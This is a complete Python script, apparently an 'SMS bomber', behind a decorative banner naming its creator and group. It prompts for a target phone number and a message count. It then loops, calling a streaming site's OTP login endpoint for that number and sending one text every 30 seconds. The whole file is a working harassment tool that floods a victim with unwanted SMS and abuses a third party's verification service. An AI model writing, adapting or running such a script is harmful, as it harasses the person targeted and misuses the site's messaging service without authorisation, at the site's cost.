import os

import time

from urllib import request



print("""                                                                                 
           __               __            ____             
   / /   __  _______/ /____  __   / __ )____  __  __
  / /   / / / / ___/ //_/ / / /  / __  / __ \/ / / /
 / /___/ /_/ / /__/ ,< / /_/ /  / /_/ / /_/ / /_/ / 
/_____/\__,_/\___/_/|_|\__, /  /_____/\____/\__, /  
                      /____/               /____/   
         
                                        
  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
  $                                         $     
  $   𝓒𝓻𝓮𝓪𝓽𝓸𝓻 : 𝓜𝓓 𝓡𝓪𝓴𝓲𝓫 𝓐𝓵 𝓗𝓪𝓼𝓪𝓷    $    
  $                                         $       
  $    ★彡[ ＯＬＤ ＧＡＮＧ ＢＯＹＳ ]彡★    $        
  $                                         $      
  $      ▀▄▀▄▀▄ 𝐹𝑅𝐼𝐸𝒩𝒟𝒮 𝒵𝒪𝒩𝐸 ▄▀▄▀▄▀      $                
  $                                         $                                                               
  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$                                                                                                                                                       
 """)

phone=input("𝕰𝖓𝖙𝖊𝖗 𝖞𝖔𝖚𝖗 𝖕𝖍𝖔𝖓𝖊 𝖓𝖚𝖒𝖇𝖊𝖗 :")

sms=int(input("𝓢𝓜𝓢 𝓠𝓾𝓪𝓷𝓽𝓲𝓽𝔂 :" ))


url ="https://www.bioscopelive.com/bn/login/send-otp?phone=88"+phone+"&operator=bd-otp"


for a in range(sms):

    request.urlopen(url)


    print(str(a+1)+ "sms send ")


    time.sleep(30)
